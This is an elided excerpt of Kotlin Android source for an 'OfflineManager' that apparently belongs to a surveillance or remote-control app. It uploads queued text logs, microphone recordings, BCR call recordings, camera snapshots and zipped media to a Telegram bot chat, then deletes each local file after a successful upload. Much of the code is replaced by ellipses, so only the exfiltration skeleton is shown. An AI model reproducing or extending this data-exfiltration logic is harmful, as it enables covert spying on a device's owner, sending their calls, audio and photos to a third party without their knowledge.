...
object OfflineManager {
    ...
    private suspend fun processTextLogs(context: Context, token: String, chatId: String) {
        ...
        for ((path, caption) in textLogPaths) {
            ...
            if (file.exists() && file.length() > 0) {
                ...
                val success = TelegramApi.sendDocument(token, chatId, context, Uri.fromFile(file), "text/plain", file.name, caption) == true
                if (success) {
                    file.delete()
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Offline log uploaded successfully and deleted.")
                    delay(2000)
                } else {
        ...
        for ((dir, caption) in fetchDirs) {
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.filter { it.isFile && it.length() > 0 }?.forEach { file ->
                    ...
                    if (success) {
                        file.delete()
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Offline FetchOps file uploaded successfully and deleted.")
                        delay(2000)
                    } else {
    ...
    private suspend fun processRecordings(context: Context, token: String, chatId: String) {
        ...
        if (micDir.exists() && micDir.isDirectory) {
            micDir.listFiles()?.filter { it.isFile && it.length() > 0 }?.forEach { file ->
                ...
                val success = TelegramApi.sendDocument(token, chatId, context, Uri.fromFile(file), "audio/*", file.name, BotMessages.Alerts.buildOfflineMicCaption()) == true
                if (success) {
                    file.delete()
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Offline Mic recording uploaded successfully and deleted.")
                    delay(2000)
                } else {
        ...
        if (prefsManager.forwardRecordingEnabled) {
            ...
            if (bcrRecordings.isNotEmpty()) {
                ...
                for ((docFile, filePath) in bcrRecordings) {
                    ...
                    if (result != null) {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Offline BCR recording uploaded successfully: $originalFileName")
    ...
    private suspend fun processSnapshots(context: Context, token: String, chatId: String) {
        ...
        if (snapshots.size > 4) {
            ...
            for (file in snapshots) {
                val success = TelegramApi.sendPhoto(token, chatId, file)
                if (success) {
                    file.delete()
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS][Queue] Successfully uploaded ${file.name} and deleted original.")
                    delay(2000)
                } else {
    ...
    private fun compressAndSendOfflineMedia(context: Context, token: String, chatId: String, items: List<MediaItem>, zipName: String, caption: String) {
        ...
        try {
            ...
            val success = TelegramApi.sendDocument(token, chatId, context, Uri.fromFile(zipFile), "application/zip", zipFile.name, caption) == true
